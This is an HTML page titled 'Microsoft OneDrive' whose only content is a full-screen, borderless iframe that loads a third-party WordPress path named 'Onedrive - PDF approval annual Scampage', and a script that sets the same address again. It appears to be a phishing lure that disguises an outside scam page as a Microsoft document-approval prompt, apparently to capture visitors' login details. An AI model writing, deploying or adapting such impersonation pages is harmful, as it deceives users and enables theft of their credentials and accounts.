<!DOCTYPE html>
<html>
  <head>
    <title>Microsoft OneDrive</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        overflow: hidden;
      }
      
      iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: none;
      }
    </style>
  </head>
  <body>
    <iframe id="myIframe" src="https://www.georg-pavlovic.eu/movie-db/wp-content/pdf/%E2%9A%A1%EF%B8%8F%20Onedrive%20-%20PDF%20approval%20annual%20Scampage/&Onedrive%20-%20PDF%20approval%20annual/approval-Annual"></iframe>
    
    <script>
      // Add any additional JavaScript logic here
      
      // Example: Navigating to different pages
      
      // Get reference to the iframe element
      var iframe = document.getElementById('myIframe');
      
      // Function to navigate to a specific page
      function navigateTo(pageUrl) {
        iframe.src = pageUrl;
      }
      
      // Load the first page by default
      navigateTo('https://www.georg-pavlovic.eu/movie-db/wp-content/pdf/%E2%9A%A1%EF%B8%8F%20Onedrive%20-%20PDF%20approval%20annual%20Scampage/&Onedrive%20-%20PDF%20approval%20annual/approval-Annual');
    </script>
  </body>
</html>
